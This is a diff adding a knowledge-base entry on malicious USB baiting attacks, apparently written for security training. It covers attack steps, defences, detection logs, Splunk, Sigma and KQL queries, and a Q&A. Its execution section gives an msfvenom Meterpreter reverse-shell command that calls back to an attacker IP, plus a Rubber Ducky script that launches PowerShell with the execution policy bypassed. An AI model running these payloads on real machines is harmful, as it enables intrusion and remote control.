@@ -1,0 +1,444 @@
+Malicious USB Attack
+- A social engineering attack that uses infected USB devices to gain access to target systems.
+
+==================================================
+Attack Metadata
+==================================================
+
+Category:
+Social_Engineering_Attacks
+
+Attack Stage:
+Initial Access
+Execution
+Persistence
+
+Difficulty:
+Intermediate
+
+Stealth Level:
+Medium
+
+Requires Authentication:
+No
+
+Tools Used:
+USB Rubber Ducky
+Bash Bunny
+Malicious Payload Scripts
+Metasploit
+Social Engineering Techniques
+
+
+==================================================
+1. Overview
+==================================================
+A malicious USB attack involves planting or delivering a USB device that executes malicious actions when connected to a target computer.
+
+Attackers rely on human curiosity or trust to convince a victim to insert the device into a system.
+
+Once connected, the USB device can:
+
+- install malware
+- execute commands
+- steal credentials
+- open remote access channels
+
+This attack type is often used in targeted intrusion campaigns and physical penetration tests.
+
+Common names include:
+
+- USB drop attack
+- USB baiting
+- BadUSB attack
+
+
+==================================================
+2. Attack Scenario
+==================================================
+An attacker leaves infected USB drives in areas where employees may find them.
+
+Examples include:
+
+- office parking lots
+- conference rooms
+- building entrances
+
+When an employee plugs the USB device into their computer, malicious payloads are executed.
+
+This may result in:
+
+- malware installation
+- credential theft
+- system compromise
+- network access
+
+
+==================================================
+3. Tools Required
+==================================================
+
+USB Rubber Ducky
+A programmable USB device that acts as a keyboard to inject commands.
+
+Bash Bunny
+A USB attack platform capable of executing multiple payloads.
+
+Malicious Payload Scripts
+Custom scripts that execute commands on the target system.
+
+Metasploit
+Used to generate payloads or reverse shells.
+
+Social Engineering Techniques
+Used to convince targets to insert the USB device.
+
+
+==================================================
+4. Attack Workflow
+==================================================
+
+Prepare Malicious USB Device
+        ↓
+Plant Device in Target Environment
+        ↓
+Victim Inserts USB Device
+        ↓
+Payload Executes Automatically
+        ↓
+Malware or Remote Access Installed
+        ↓
+Attacker Gains System Access
+
+
+==================================================
+5. Step-by-Step Execution
+==================================================
+Step 1 — Create Payload
+
+Example Metasploit payload:
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe
+
+
+Step 2 — Program USB Device
+
+Example USB Rubber Ducky script:
+
+DELAY 1000  
+GUI r  
+DELAY 500  
+STRING powershell -ExecutionPolicy Bypass -File payload.ps1  
+ENTER  
+
+
+Step 3 — Deploy USB Device
+
+The attacker leaves the USB device in locations where employees may find it.
+
+
+Step 4 — Victim Connects USB
+
+The victim plugs the USB device into a workstation.
+
+
+Step 5 — Payload Executes
+
+The USB device injects keystrokes or runs scripts automatically.
+
+
+Step 6 — Establish Remote Access
+
+The payload creates a reverse connection to the attacker.
+
+
+==================================================
+6. Example Attack Scenario
+==================================================
+Preparation
+
+The attacker programs a USB Rubber Ducky with a malicious payload.
+
+
+Deployment
+
+The USB device is placed in an office parking lot.
+
+
+User Interaction
+
+An employee inserts the USB device into their workstation.
+
+
+Execution
+
+The payload runs automatically and installs a reverse shell.
+
+
+Access
+
+The attacker gains remote control of the compromised machine.
+
+
+==================================================
+7. Expected Results
+==================================================
+Successful malicious USB attacks allow attackers to:
+
+- execute commands on victim machines
+- install malware
+- establish persistence
+- gain network access
+
+These attacks bypass many perimeter defenses because they rely on physical access and user interaction.
+
+
+==================================================
+8. Defensive Considerations
+==================================================
+Organizations can reduce the risk of malicious USB attacks through several controls.
+
+USB Device Restrictions
+
+Disable or restrict USB storage devices on corporate systems.
+
+Endpoint Security
+
+Detect and block unauthorized device behavior.
+
+Security Awareness Training
+
+Educate employees about USB baiting attacks.
+
+Device Control Policies
+
+Allow only approved USB devices.
+
+Network Monitoring
+
+Detect unusual outbound connections.
+
+
+==================================================
+9. MITRE ATT&CK Mapping
+==================================================
+
+Technique:
+T1200 — Hardware Additions
+
+Technique:
+T1204 — User Execution
+
+Technique:
+T1059 — Command and Scripting Interpreter
+
+Technique:
+T1105 — Ingress Tool Transfer
+
+
+==================================================
+10. Blue Team Detection
+==================================================
+Malicious USB attacks generate endpoint-level activity that can be monitored.
+
+Indicators may include:
+
+- new USB devices connected to systems
+- execution of scripts shortly after USB insertion
+- unexpected PowerShell or command prompt activity
+- unauthorized device drivers or HID devices detected
+- outbound connections following USB interaction
+
+Security teams may also observe:
+
+- suspicious keystroke injection behavior
+- execution of encoded PowerShell commands
+- new processes spawned from user context immediately after USB insertion
+
+
+==================================================
+11. Relevant Logs
+==================================================
+
+Windows Event Logs
+
+Event ID 6416 (new device connected)  
+Event ID 4688 (process creation)  
+
+
+Endpoint Detection Logs
+
+Script execution activity  
+USB device connection events  
+
+
+PowerShell Logs
+
+Script block logging  
+Encoded command execution  
+
+
+SIEM Correlation Logs
+
+Correlation between USB insertion and process execution  
+
+
+EDR Telemetry
+
+Behavioral detection of HID-based attacks  
+
+
+==================================================
+12. Detection Tools
+==================================================
+
+Endpoint Detection & Response (EDR)
+
+Examples:
+
+- Microsoft Defender for Endpoint
+- CrowdStrike
+- SentinelOne
+
+
+Device Control Solutions
+
+Examples:
+
+- Symantec DLP
+- McAfee Device Control
+
+
+SIEM Platforms
+
+Examples:
+
+- Splunk
+- Elastic Stack
+- Microsoft Sentinel
+
+
+Forensics Tools
+
+Examples:
+
+- Autopsy
+- Volatility
+
+
+==================================================
+13. SOC Detection Queries
+==================================================
+
+Splunk Query (USB Device Connection)
+
+index=windows EventCode=6416
+| stats count by DeviceDescription, HostName
+
+
+Splunk Query (Suspicious PowerShell After USB)
+
+index=windows EventCode=4688
+CommandLine="*powershell*"
+| stats count by HostName, User
+
+
+Sigma Rule Example
+
+title: Suspicious USB Execution Activity
+logsource:
+  product: windows
+detection:
+  selection:
+    EventID: 4688
+    CommandLine: "*powershell*"
+  condition: selection
+level: high
+
+
+Microsoft Sentinel (KQL) Example
+
+DeviceEvents
+| where ActionType == "UsbDeviceConnected"
+| summarize count() by DeviceName, InitiatingProcessAccountName
+
+
+==================================================
+14. Mitigation Strategies
+==================================================
+
+Disable Unauthorized USB Devices
+
+Restrict removable media access.
+
+Implement Device Control Policies
+
+Allow only approved USB devices.
+
+Enable PowerShell Logging
+
+Monitor script execution.
+
+Deploy EDR Solutions
+
+Detect behavioral anomalies.
+
+User Awareness Training
+
+Educate employees about USB baiting risks.
+
+
+==================================================
+15. Blue Team Knowledge Base Cross-References
+==================================================
+
+Blue Team → Endpoint Security
+
+Blue Team → Threat Hunting
+
+Blue Team → Detection Engineering
+
+Blue Team → Incident Response
+
+
+==================================================
+16. Questions & Answers
+==================================================
+
+Question:
+What is a malicious USB attack?
+
+Answer:
+A social engineering attack where attackers use infected USB devices to compromise systems.
+
+--------------------------------------------------
+
+Question:
+Why are USB baiting attacks effective?
+
+Answer:
+They rely on human curiosity and trust.
+
+--------------------------------------------------
+
+Question:
+What device can simulate keyboard input to execute commands?
+
+Answer:
+USB Rubber Ducky.
+
+--------------------------------------------------
+
+Question:
+What is a common payload used in malicious USB attacks?
+
+Answer:
+Reverse shells or malware installers.
+
+--------------------------------------------------
+
+Question:
+How can organizations defend against malicious USB attacks?
+
+Answer:
+By restricting USB devices, implementing endpoint protection, and training employees.
